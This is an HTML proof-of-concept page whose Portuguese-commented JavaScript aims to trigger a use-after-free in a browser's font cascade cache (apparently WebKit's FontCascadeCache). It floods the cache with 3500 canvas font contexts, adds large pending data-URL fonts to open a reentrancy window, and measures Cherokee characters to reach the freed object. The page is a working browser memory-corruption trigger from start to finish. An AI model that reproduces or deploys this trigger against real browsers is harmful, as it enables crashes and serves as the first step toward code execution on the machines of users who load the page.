
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - Fiel ao Commit (FontCascadeCache Prune UAF)</title>
</head>
<body>
<script>
    // 1. Satura o cache de fontes para forçar o prune inline (3500 contextos)
    const dummies = [];
    for (let i = 0; i < 3500; i++) {
        const dummy = document.createElement('canvas').getContext('2d');
        dummy.font = '10px "dummy' + i + '"';
        dummies.push(dummy);
    }

    // 2. Cria a fonte pendente grande para o reentrancy window
    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';

    const metricsDonor = new FontFace('metricsDonor', pendingFontURL);
    const measured = new FontFace('measured', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
    
    document.fonts.add(metricsDonor);
    document.fonts.add(measured);

    const canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    const context = canvas.getContext('2d');
    
    context.font = '10px metricsDonor, measured';

    // 3. Dispara o glyph walk com os caracteres Cherokee (\u13A0\u13A2\u13A4)
    // para acionar o CodePath::Simple e forçar o UAF no FontCascadeFonts primário.
    try {
        context.measureText('\u13A0\u13A2\u13A4');
    } catch (e) {
        console.error(e);
    }
</script>
</body>
</html>
